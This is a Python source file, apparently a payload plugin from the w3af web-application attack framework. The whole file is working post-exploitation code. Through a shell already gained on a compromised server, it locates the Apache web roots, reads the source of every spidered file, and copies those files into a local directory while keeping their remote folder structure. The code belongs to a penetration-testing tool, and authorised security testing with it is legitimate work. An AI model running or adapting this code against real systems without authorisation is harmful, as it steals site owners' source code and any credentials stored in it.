import core.data.kb.knowledgeBase as kb
from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table
import os


class get_source_code(base_payload):
    '''
    Get the source code for all files that were spidered by w3af.
    '''
    def api_read(self, parameters):
        self.result = {}
        
        #
        #    Parameter validation
        #
        if len(parameters) != 1:
            msg = 'You need to specify an output directory where the '
            msg += 'remote application source will be downloaded.'
            raise Exception(msg)
        
        else:
            output_directory = parameters[0]
            if not os.path.isdir( output_directory ):
                msg = 'The output directory "%s" is invalid.'
                raise Exception( msg % output_directory )
            
            elif not os.access(output_directory, os.W_OK):
                msg = 'Failed to open "%s" for writing.'
                raise Exception( msg % output_directory )
            
            else:
                #
                #    The real stuff
                #
                
                apache_root_directory = self.exec_payload('apache_root_directory')
                webroot_list = apache_root_directory['apache_root_directory']
                
                url_list = kb.kb.getData('urls', 'url_objects')
                
                for webroot in webroot_list:
                    for url in url_list:

                        path_and_file = url.getPath()
                        relative_path_file = path_and_file[1:]
                        remote_full_path = os.path.join(webroot, relative_path_file )
                                                                       
                        file_content = self.shell.read(remote_full_path)
                        if file_content:
                            #
                            # Now I write the file to the local disk
                            # I have to maintain the remote file structure
                            #
                            
                            # Create the file path to be written to disk
                            # FIXME: The webroot[1:] only works in Linux. For windows with C:\ it won't work
                            local_full_path = os.path.join(output_directory, webroot[1:], relative_path_file)
                            
                            #    Create the local directories (if needed)
                            local_directory = os.path.dirname( local_full_path )
                            if not os.path.exists(local_directory):
                                os.makedirs(local_directory)
                            
                            #    Write the file!
                            fh = file(local_full_path, 'w')
                            fh.write(file_content)
                            fh.close()
                            
                            self.result[url] = (remote_full_path, local_full_path)
                        
        
        return self.result

    def run_read(self, parameters):

        api_result = self.api_read(parameters)
        
        if not api_result:
            return 'Failed to download the application source code.'
        else:
            rows = []
            rows.append( ['Remote file','Local file',] ) 
            rows.append( [] )
            
            for url, (remote_filename, local_filename) in api_result.items():
                rows.append( [remote_filename,local_filename] )
                
            result_table = table( rows )
            result_table.draw( 140 )                    
            return

